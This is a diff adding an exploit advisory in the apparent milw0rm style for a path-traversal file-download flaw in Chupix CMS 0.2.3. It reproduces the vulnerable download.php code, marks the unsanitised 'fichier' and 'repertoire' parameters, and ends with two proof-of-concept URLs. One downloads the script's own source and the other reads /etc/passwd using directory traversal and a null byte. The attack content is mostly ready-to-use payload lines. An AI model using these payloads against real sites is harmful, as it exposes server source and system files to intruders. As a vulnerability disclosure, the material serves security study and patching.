@@ -1,0 +1,92 @@
+# Chupix CMS 0.2.3 (download.php) Remote File Download Vulnerability
+# P.Script : http://sourceforge.net/project/showfiles.php?group_id=134930
+################################download.php################################
+Lain:18->57 ->
+********************************************************************************************************************
+if(isset($_GET['fichier'])){ <--------------XXXX                             
+                                       *
+		// téléchargement du fichier                                               
+                         *
+		$file = "archives/". $_GET['repertoire'] ."/". 
+$_GET['fichier'];<--------------XXXX                *
+		$fichier_txt = "archives/". $_GET['repertoire'] ."/cpt/". $_GET['fichier'] 
+.".php"                 *
+		$repertoire = "archives/". $_GET['repertoire'] ."/cpt/";                   
+                         *
+		if(is_file($fichier_txt)){                                                 
+                         *
+			$fp           =   @fopen($fichier_txt, "r");  <--------------XXXX         
+                  *
+			$result       =   fread($fp, filesize ($fichier_txt));                    
+                  *
+			fclose($fp);                                                              
+                  *
+			$result       =   str_replace("<?php ", "", $result);                     
+                  *
+			$result       =   str_replace("?>", "", $result);                         
+                  *
+		                                                                           
+                         *
+			$num = trim($result);                                                     
+                  *
+		}else{                                                                     
+                         *
+			$num = 0;                                                                 
+                  *
+		}                                                                          
+                         *
+		$num++;                                                                    
+                         *
+		                                                                           
+                         *
+		$msg = "<?php ". $num ." ?>";                                              
+                         *
+		                                                                           
+                         *
+		if(!(is_dir($repertoire))){                                                
+                         *
+			mkdir ($repertoire, 0755);                                                
+                  *
+		}                                                                          
+                         *
+		                                                                           
+                         *
+		$fp  =   @fopen($fichier_txt, "w+");<--------------XXXX                    
+                         *
+	  	if (flock($fp, LOCK_EX)) { // pose un verrou exclusif                    
+                           *
+    		fwrite($fp, $msg);                                                     
+                             *
+   			flock($fp, LOCK_UN); // libère le verrou                               
+                     *
+		}else{                                                                     
+                         *
+    		echo "Impossible de verrouiller le fichier <font color=\"maroon\">". 
+$fichier ."</font>";          *
+		}                                                                          
+                         *
+   	 	fclose($fp);                                                           
+                             *
+   	                               	                                         
+                                   *                                         
+                                                           *
+   	 	                                                                       
+                             *
+		                                                                           
+                         *
+		header("Content-type: application/force-download");                        
+                         *
+		header("Content-Disposition: attachment; filename=".$_GET['fichier']);     
+                         *
+		readfile($file);<--------------XXXX                                        
+                         *
+}                                                                            
+                                       *
+********************************************************************************************************************
+# POC:
+      /download.php?repertoire=defaut&fichier=../../download.php
+      /download.php?fichier=../../../../../../../etc/passwd%00
+# Discovered by: GoLd_M
+# SP.TanX = Tryag.Com & Asb-May.Net & Milw0rm.Com
+
+# milw0rm.com [2007-09-15]
